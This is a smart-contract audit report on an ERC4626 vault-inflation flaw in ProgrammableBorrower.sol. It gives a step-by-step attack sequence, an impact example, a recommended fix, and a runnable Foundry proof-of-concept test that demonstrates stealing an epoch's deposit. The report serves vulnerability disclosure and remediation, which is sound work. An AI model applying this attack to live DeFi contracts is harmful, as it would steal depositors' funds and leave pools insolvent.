### Title
Unchecked ERC4626 deposit lets vault share inflation steal epoch liquidity - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` accepts any ERC4626 vault with the configured underlying and sweeps all idle assets into it at epoch start. `_depositToVault` records the deposit but never verifies that the vault returned shares or that those shares are redeemable for approximately the deposited assets. An attacker who first inflates the vault's asset-per-share ratio can make the deposit truncate to zero shares, seize the entire epoch deposit, and leave the credit pool insolvent.

### Finding Description
`initialize` accepts an arbitrary ERC4626 vault matching the underlying token and grants it unlimited underlying allowance [1](#0-0) . During `onStartEpoch`, the contract snapshots on-hand cash plus existing vault assets and then deposits the full cash balance [2](#0-1) . `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and records only the returned share count in an event; it has no minimum-share or post-deposit valuation check [3](#0-2) .

In a running programmable-borrower epoch, the attacker sequence is:

1. Before the first liquidity enters a fresh, truncation-vulnerable vault, deposit `1` underlying and receive `1` share.
2. Transfer `inflation` underlying directly to the vault, where `inflation >= poolDeposit`.
3. A honest manager calls `IdleCDOEpochVariant.startEpoch`, sending pool assets to `ProgrammableBorrower`.
4. `onStartEpoch` deposits `poolDeposit` into the inflated vault.
5. Vault share calculation `poolDeposit * 1 / (1 + inflation)` truncates to `0`; the programmable borrower receives no shares.
6. The attacker redeems their single share and receives `1 + inflation + poolDeposit`.
7. `ProgrammableBorrower` holds zero vault assets, while the CDO still carries strategy-token principal until a withdrawal or close attempts to source the missing funds.

Because `_currentVaultAssets` is derived solely from the borrower's vault share balance, it returns zero after the zero-share deposit [4](#0-3) . `_vaultNetInterest` then reports the full principal as a vault loss, while `totalInterestDueNow` clamps the pool-facing yield to zero [5](#0-4) . A normal minted-interest stop does not need to recall principal, so the theft can remain hidden until pending withdrawals or pool closure require cash.

### Impact Explanation
The attacker can steal the full amount swept into the vault during an epoch start. For example, if the CDO sends 1,000,000 USDC, the attacker deposits `1` wei-equivalent share, donates `1,000,000` USDC to the vault, causes the pool's deposit to mint zero shares, and redeems the sole share for `2,000,001` USDC. The attacker recovers their donation and gains the pool's `1,000,000` USDC.

This breaks solvency and fair mint/burn: active tranche holders retain strategy-token accounting principal, but the corresponding external assets have already been removed by the attacker. The eventual withdrawal or close cannot be funded and enters the default path with a potentially zero recovery price.

### Likelihood Explanation
Likelihood is deployment-dependent but not dependent on a malicious privileged role. An honest owner or manager only needs to configure a fresh ERC4626 vault that lacks inflation protection or has not yet been seeded. An unprivileged vault user can then establish the inflated first share before the first `startEpoch`. Vaults with virtual shares/assets or existing deep liquidity prevent the complete zero-share theft, but `ProgrammableBorrower` itself has no integration-level check that would reject the unsafe deposit.

### Recommendation
Add deposit slippage validation to `_depositToVault` and the active-epoch repayment path that deposits into the vault. At minimum:

```solidity
uint256 expectedShares = vault.previewDeposit(_assetAmount);
require(expectedShares != 0, "zero vault shares");
uint256 shares = vault.deposit(_assetAmount, address(this));
require(shares >= expectedShares, "vault deposit slippage");
require(vault.convertToAssets(shares) >= _assetAmount - MAX_ROUNDING_LOSS, "vault loss");
```

Prefer previewing and enforcing a caller-configured minimum share amount or require the returned shares to be worth the deposited amount within one or two wei of ERC4626 rounding. Prefer vaults with virtual-share inflation protection, but do not rely solely on external vault behavior.

### Proof of Concept
A reproducible Foundry test can deploy a conforming but truncation-vulnerable vault on a fork, initialize `ProgrammableBorrower`, and demonstrate the theft:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract TestToken is ERC20 {
    constructor() ERC20("Underlying", "UND") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract TruncatingVault is ERC20 {
    TestToken public immutable assetToken;

    constructor(TestToken asset_) ERC20("Vault Share", "vUND") {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 supply = totalSupply();
        uint256 assetsBefore = totalAssets();
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;

        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract FakeIdleCDO {
    address public immutable token;

    constructor(address token_) {
        token = token_;
    }
}

contract ProgrammableBorrowerInflationPoC is Test {
    function testEpochDepositMintsZeroVaultSharesAndAttackerStealsFunds() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        TestToken underlying = new TestToken();
        TruncatingVault vault = new TruncatingVault(underlying);
        FakeIdleCDO cdo = new FakeIdleCDO(address(underlying));

        ProgrammableBorrower implementation = new ProgrammableBorrower();
        ProgrammableBorrower programmableBorrower = ProgrammableBorrower(
            address(
                new ERC1967Proxy(
                    address(implementation),
                    abi.encodeCall(
                        ProgrammableBorrower.initialize,
                        (
                            address(vault),
                            address(cdo),
                            address(this),
                            address(this),
                            makeAddr("borrower"),
                            0
                        )
                    )
                )
            )
        );

        address attacker = makeAddr("attacker");
        uint256 inflation = 1_000_000e18;
        uint256 poolDeposit = 1_000_000e18;

        // Attacker owns the only share, then inflates the share price.
        underlying.mint(attacker, inflation + 1);
        vm.startPrank(attacker);
        underlying.approve(address(vault), 1);
        vault.deposit(1, attacker);
        underlying.transfer(address(vault), inflation);
        vm.stopPrank();

        // Simulate IdleCDOEpochVariant.startEpoch funding the borrower adapter.
        underlying.mint(address(programmableBorrower), poolDeposit);
        vm.prank(address(cdo));
        programmableBorrower.onStartEpoch(0);

        // Integer truncation minted no shares to the pool.
        assertEq(vault.balanceOf(address(programmableBorrower)), 0);

        // The attacker redeems the only share and receives their inflation plus poolDeposit.
        uint256 attackerBefore = underlying.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(
            underlying.balanceOf(attacker) - attackerBefore,
            inflation + poolDeposit + 1
        );
        assertEq(underlying.balanceOf(address(programmableBorrower)), 0);
        assertEq(programmableBorrower.vaultSharesBalance(), 0);
    }
}
```
